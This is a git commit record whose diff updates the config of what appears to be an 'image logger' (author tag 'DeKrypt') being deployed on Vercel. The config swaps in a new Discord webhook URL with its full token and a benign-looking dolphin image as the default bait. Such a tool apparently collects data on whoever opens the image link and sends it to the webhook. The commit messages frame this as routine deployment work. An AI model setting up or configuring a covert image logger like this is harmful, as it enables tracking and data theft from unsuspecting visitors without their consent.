7a016f3280cc349e44340b78a119560f0d9edde8
poesjemauw133-ship-it <poesjemauw133@gmail.com>
2026-07-01 04:41:46 +0200

    Squashed commit of the following:
    commit 8469639f22def38ad42a7c8a1c060f7c6c3f948d
    Author: poesjemauw133-ship-it <poesjemauw133@gmail.com>
    Date:   Wed Jul 1 04:16:42 2026 +0200
    
        Remove old docs and configure Vercel deployment
    
        Delete empty Logger file and README.md. Add vercel.json configuration to set up Python runtime and rewrite routes for image logger API.
    
    commit dd17a50a02621e463159f9a1f3e6b005cf32eae7
    Author: poesjemauw133-ship-it <poesjemauw133@gmail.com>
    Date:   Wed Jul 1 04:08:51 2026 +0200
    
        Move main.py to api/ and update defaults
    
        Renamed main.py -> api/main.py and updated default config values (webhook and image URL). Normalized requirements.txt spacing/newline and added a vercel.json placeholder to support Vercel deployment. These changes reorganize the project for deployment and refresh the default webhook/image settings.

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1521696825143197797/q_VpAi3PUx5nO_Z6bo1BVRnQ09VJpEp1CMzJ71z7VWw6xaigTs30aGrNZs1RHWWws7i_",
+    "image": "https://cdn.pixabay.com/photo/2017/09/02/22/10/dolphin-2708695_1280.png?format=png&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
